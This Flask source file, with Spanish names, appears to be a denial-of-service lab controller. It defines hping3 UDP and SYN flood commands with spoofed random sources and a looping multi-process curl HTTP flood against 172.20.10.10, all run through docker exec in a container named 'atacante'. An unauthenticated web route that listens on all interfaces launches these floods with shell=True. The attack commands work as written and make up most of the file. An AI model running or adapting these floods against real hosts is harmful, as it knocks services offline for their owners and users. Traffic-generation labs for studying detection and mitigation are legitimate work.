from flask import Flask, render_template, request
import subprocess

app = Flask(__name__)

ATAQUES = {
    "udp": "docker exec atacante hping3 --udp -d 1000 -p 80 --flood --rand-source 172.20.10.10",
    "syn": "docker exec atacante hping3 -S -p 80 --flood --rand-source 172.20.10.10",
    # Versión mejorada con el bucle de curl:
    "http": "docker exec atacante sh -c 'for i in $(seq 1 20); do while true; do curl -s http://172.20.10.10 -o /dev/null; done & done; wait'",
    "stop": "docker exec atacante pkill hping3; docker exec atacante pkill curl; docker exec atacante pkill sh"
}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/atacar/<tipo>')
def atacar(tipo):
    if tipo in ATAQUES:
        subprocess.Popen(ATAQUES[tipo], shell=True)
        return f"Ataque {tipo} iniciado", 200
    return "Tipo no válido", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)